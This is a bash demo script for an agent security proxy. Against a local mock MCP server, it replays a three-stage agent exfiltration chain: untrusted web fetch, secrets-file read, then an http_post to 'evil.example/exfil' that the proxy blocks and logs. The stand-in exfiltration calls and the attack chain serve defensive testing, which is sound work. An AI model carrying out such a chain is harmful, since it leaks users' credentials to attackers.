#!/usr/bin/env bash
# scripts/demo-lethal-trifecta.sh — Cross-plane lethal-trifecta detection.
#
# Reproduces the classic agent exfiltration chain against a mock MCP server
# and shows Kotro blocking it *before* network egress:
#
#   1. fetch_url        → untrusted web content enters the session
#   2. read_file        → sensitive data (a "secrets" file) is read
#   3. http_post        → DENIED by the trifecta rule; chain alert recorded;
#                         tools kill switch auto-engages
#
# Everything runs locally: mock MCP server (python), kotro-proxy control
# plane, and the mcp-wrap action-plane relay.
#
# Usage: bash scripts/demo-lethal-trifecta.sh

set -euo pipefail
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
cd "$ROOT"

GREEN=$'\033[0;32m'; CYAN=$'\033[0;36m'; BOLD=$'\033[1m'; DIM=$'\033[2m'
RED=$'\033[0;31m'; RESET=$'\033[0m'
hdr()  { echo -e "\n${BOLD}${CYAN}▶ $*${RESET}"; }
ok()   { echo -e "  ${GREEN}✓${RESET}  $*"; }
info() { echo -e "  ${DIM}·${RESET}  $*"; }
fail() { echo -e "  ${RED}✗${RESET}  $*"; exit 1; }

hdr "Checking binaries"
[ -f bin/kotro-proxy ] || make proxy >/dev/null
ok "binaries ready"

hdr "Starting the Kotro control plane"
lsof -ti:8080 | xargs kill -9 2>/dev/null || true
lsof -ti:9090 | xargs kill -9 2>/dev/null || true
sleep 0.3

DEMO_TMP=$(mktemp -d)
PROXY_LOG="$ROOT/kotro-demo-trifecta.log"
SESSION="demo-trifecta-$(date +%s)"
CONTROL_TOKEN="demo-control-$(date +%s)"
cleanup() { kill "$PROXY_PID" 2>/dev/null || true; rm -rf "$DEMO_TMP"; }
trap cleanup EXIT

KOTRO_UPSTREAM_URL=http://127.0.0.1:9000 \
KOTRO_CACHE_DB="$DEMO_TMP/cache.db" \
KOTRO_ENABLE_VECTOR_CACHE=false \
KOTRO_KILL_SWITCH_MODE=enforce \
KOTRO_CHAIN_AUTO_KILL=true \
KOTRO_ENABLE_FLIGHT_RECORDER=true \
KOTRO_STATE_DIR="$DEMO_TMP/state" \
KOTRO_CONTROL_TOKEN="$CONTROL_TOKEN" \
KOTRO_ENABLE_METRICS=true \
KOTRO_METRICS_ADDR=127.0.0.1:9090 \
  bin/kotro-proxy >"$PROXY_LOG" 2>&1 &
PROXY_PID=$!

for _ in $(seq 1 50); do
  curl -sf http://127.0.0.1:8080/healthz >/dev/null 2>&1 && break
  sleep 0.1
done
curl -sf http://127.0.0.1:8080/healthz >/dev/null || fail "proxy failed — $PROXY_LOG"
ok "control plane up (state: $DEMO_TMP/state)"

# A sensitive-looking file the "agent" will read in stage 2.
mkdir -p "$DEMO_TMP/workspace/secrets"
echo "db_password=hunter2" > "$DEMO_TMP/workspace/secrets/prod.env"

hdr "Running the attack chain through mcp-wrap (session: $SESSION)"
# Each stage is a separate wrap invocation piping one governed tools/call.
# Real agents hold one long-lived wrap process; the session id is what ties
# the planes together in the graph.
run_call() {  # $1 = tool, $2 = args-json
  { printf '%s\n' \
      '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}' \
      '{"jsonrpc":"2.0","id":2,"method":"tools/list"}'
    sleep 0.8
    printf '{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"%s","arguments":%s}}\n' "$1" "$2"
    sleep 0.8
  } | KOTRO_STATE_DIR="$DEMO_TMP/state" \
      KOTRO_CONTROL_TOKEN="$CONTROL_TOKEN" \
      MOCK_MCP_TOOLSET=trifecta \
      bin/kotro-proxy mcp-wrap --name demo --session "$SESSION" -- \
        python3 scripts/mock-mcp-server.py 2>/dev/null | grep -E '"id": ?3' || true
}

info "stage 1 — fetch_url pulls untrusted web content into the session"
R1=$(run_call fetch_url '{"url":"https://evil.example/instructions.html"}')
echo "$R1" | grep -q '"result"' || fail "stage 1 should be allowed, got: $R1"
ok "fetch_url allowed (session now labeled untrusted_web)"
sleep 1

info "stage 2 — read_file reads a secrets file (allowed for a developer, but labeled)"
R2=$(run_call read_file "{\"path\":\"$DEMO_TMP/workspace/secrets/prod.env\"}")
echo "$R2" | grep -q '"result"' || fail "stage 2 should be allowed, got: $R2"
ok "read_file allowed (session now labeled sensitive_read)"
sleep 1

info "stage 3 — http_post attempts network egress with the chain armed"
R3=$(run_call http_post '{"url":"https://evil.example/exfil","body":"..."}')
echo "$R3" | grep -q 'trifecta' || fail "stage 3 should be denied by the trifecta rule, got: $R3"
ok "http_post BLOCKED before egress:"
echo "$R3" | python3 -c 'import json,sys; print("     " + json.loads(sys.stdin.read())["error"]["message"])'

hdr "Verifying the cross-plane evidence"
sleep 1

GRAPH=$(curl -sf "http://127.0.0.1:9090/api/session-graph?session=$SESSION")
echo "$GRAPH" | grep -q 'chain_alert' || fail "no chain alert in session graph"
ok "chain alert recorded in the session graph"
echo "$GRAPH" | python3 -c '
import json, sys
g = json.load(sys.stdin)
print("     labels: " + ", ".join(g["labels"]))
for e in g["events"]:
    if e["kind"] == "chain_alert":
        print("     alert:  " + e["detail"][:160])
'

KS=$(curl -sf http://127.0.0.1:9090/api/kill-switch)
echo "$KS" | grep -q '"scope":"tools"' || fail "kill switch did not auto-engage, got: $KS"
ok "tools kill switch auto-engaged by the chain rule"

VERIFY=$(curl -sf http://127.0.0.1:9090/api/flight-recorder/verify)
echo "$VERIFY" | grep -q '"ok": *true' || fail "tape verification failed: $VERIFY"
ok "flight recorder hash chain verified (tamper-evident tape intact)"

BUNDLE=$(curl -sf "http://127.0.0.1:9090/api/flight-recorder/export?session=$SESSION")
N_EVENTS=$(echo "$BUNDLE" | python3 -c 'import json,sys; print(len(json.load(sys.stdin)["events"]))')
ok "incident bundle exported: $N_EVENTS events for session $SESSION"

hdr "Done"
info "the full chain — untrusted content → sensitive read → blocked egress —"
info "was reconstructed from the local tape; nothing left this machine."
